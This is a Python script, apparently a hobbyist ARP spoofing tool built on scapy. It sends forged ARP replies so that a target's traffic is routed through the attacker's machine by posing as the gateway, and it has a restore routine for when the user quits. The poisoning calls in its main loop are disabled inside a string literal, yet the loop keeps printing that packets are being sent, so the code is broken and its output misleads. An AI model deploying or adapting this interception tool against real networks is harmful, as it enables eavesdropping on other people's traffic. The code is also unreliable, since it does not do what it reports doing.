import scapy.all as scapy
import time
import optparse


class Banners:
    ERROR = """
    ▒█▀▀▀ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀█ ▒█▀▀█ █ 
    ▒█▀▀▀ ▒█▄▄▀ ▒█▄▄▀ ▒█░░▒█ ▒█▄▄▀ ▀ 
    ▒█▄▄▄ ▒█░▒█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█ ▄
    """

    QUIT = """
    ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀▀ ▒█░░▒█ ▒█▀▀▀█ ▒█░▒█ 
    ░▀▀▀▄▄ ▒█▀▀▀ ▒█▀▀▀ ▒█▄▄▄█ ▒█░░▒█ ▒█░▒█ 
    ▒█▄▄▄█ ▒█▄▄▄ ▒█▄▄▄ ░░▒█░░ ▒█▄▄▄█ ░▀▄▄▀
    """

    LOGO = """
    ▒█▀▀█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▄ ▒█▀▀▀ ▒█░░▒█ 
    ▒█▀▀▄ ▒█░▒█ ▒█▄▄▀ ▒█░▒█ ▒█▀▀▀ ░▒█▒█░ 
    ▒█▄▄█ ░▀▀█▄ ▒█░▒█ ▒█▄▄▀ ▒█▄▄▄ ░░▀▄▀░
    """


def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)

def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=5)

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")
    options = parse_object.parse_args()[0]
    if not options.target_ip:
        print("Error : Please enter a target ip")
    if not options.gateway_ip:
        print("Error : Please enter a gateway ip")
    return options

if __name__ == "__main__":
    number = 0
    print(Banners.LOGO)
    print("This application was developed by bqrdev.\n")
    """
    targetIP = input(str("Enter target IP: "))
    poisonIP = input(str("Enter the IP to poison (Modem, Router): "))
    """
    user_ips = get_user_input()
    user_target_ip = user_ips.target_ip
    user_gateway_ip = user_ips.gateway_ip
    try:
        while True:
            """
            arp_poisoning(targetIP, poisonIP)
            arp_poisoning(poisonIP, targetIP)
            """
            number += 1
            print(f"\rPackages are being sent from address {user_target_ip} to address {user_gateway_ip}. ", end="")
            print(str(number))
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n\nEverything is being restored to its former state.")
        """
        reset_operation(targetIP, poisonIP)
        reset_operation(poisonIP, targetIP)
        """
        reset_operation(user_target_ip,user_gateway_ip)
        reset_operation(user_gateway_ip,user_target_ip)
        print("Exiting.")
        time.sleep(3)
    finally:
        print(Banners.QUIT)
else:
    print(Banners.ERROR)
